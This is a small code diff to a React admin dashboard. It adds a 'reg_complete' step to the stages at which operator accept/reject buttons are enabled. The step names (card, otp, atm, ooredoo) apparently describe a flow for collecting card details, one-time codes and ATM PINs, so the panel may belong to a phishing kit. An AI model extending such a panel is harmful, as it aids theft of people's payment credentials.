@@ -414,7 +414,7 @@ export default function AdminDashboard() {
 
 function DataSection({ title, icon, data, onAccept, onReject, currentStep }: any) {
   // تفعيل الأزرار فقط من مرحلة اتمام التسجيل والاشتراك وما بعده
-  const enableButtons = ['personal', 'card', 'otp', 'atm', 'ooredoo', 'otp_ooredoo', 'success'].includes(currentStep);
+  const enableButtons = ['personal', 'card', 'otp', 'atm', 'ooredoo', 'otp_ooredoo', 'success', 'reg_complete'].includes(currentStep);
   
   return (
     <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm hover:shadow-md transition-shadow">
